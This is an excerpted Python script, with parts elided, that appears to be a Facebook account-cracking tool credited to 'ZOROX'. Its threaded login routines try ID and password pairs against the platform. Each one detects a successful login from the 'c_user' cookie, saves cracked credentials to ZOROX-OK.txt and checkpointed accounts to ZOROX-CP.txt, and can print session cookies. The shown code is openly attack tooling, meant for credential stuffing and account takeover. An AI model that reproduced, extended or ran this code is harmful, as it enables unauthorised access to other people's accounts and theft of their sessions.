#created by ZOROX aka SACHIN SHRESTHA
#open source by ZOROX
#github= ZOROX-XD
#BY BY MEY KABHI WAPIS NAHI AAUNGA AB 
#JAI NEPAL
# fb id https://www.facebook.com/sachin.shrestha.165033
...
try:
    ...
    os.system('python bozx-zorox.py')
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
...
os.system("xdg-open https://github.com/Zoroxffx")
#app  check 
...
def zorox():
    ...
    elif bozx =='7':os.system("xdg-open https://www.facebook.com/sachin.shrestha.165033")
    else:
...
def zorox1():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print(f'[+] METHOD CHOOSED : M{zoroxfire}')
	...
	print('[?] Ids saved in ZOROX-OK.txt,ZOROX-CP.txt')
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[ZOROX-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in xerx_xd:
					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/ZOROX-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[ZOROX-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/ZOROX-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/ZOROX-CP.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-ZOROX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-ZOROX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-ZOROX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-ZOROX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M5-ZOROX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-ZOROX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
